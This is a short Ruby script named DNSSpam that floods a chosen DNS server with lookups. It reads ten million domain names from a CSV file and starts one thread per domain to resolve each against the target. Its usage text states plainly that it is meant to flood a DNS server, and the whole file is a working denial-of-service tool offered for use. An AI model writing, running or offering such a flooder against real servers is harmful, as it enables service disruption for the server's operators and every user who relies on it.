#!/bin/ruby

require 'resolv'


if ARGV[0] == nil || ARGV[0] == ""
  puts "
  DNSSpam is a simple \"multithreaded\"(as much as ruby can be) tool designed to flood a dns server with requests.

  DNSSpam <dnsserver>
  
  "
  exit
end


domains = Array.new

#file was obtained from https://www.domcop.com/top-10-million-domains
File.foreach('top10milliondomains.csv').each {|l| domains << l.split(',')[1].tr("\"","")}

threads = []

domains.each do |domain|
threads << Thread.new {
    begin
      puts Resolv::DNS.new(:nameserver => [ARGV[0]]).getaddress domain 
    rescue Resolv::ResolvError
    end
  }
end

threads.each {|t| t.join}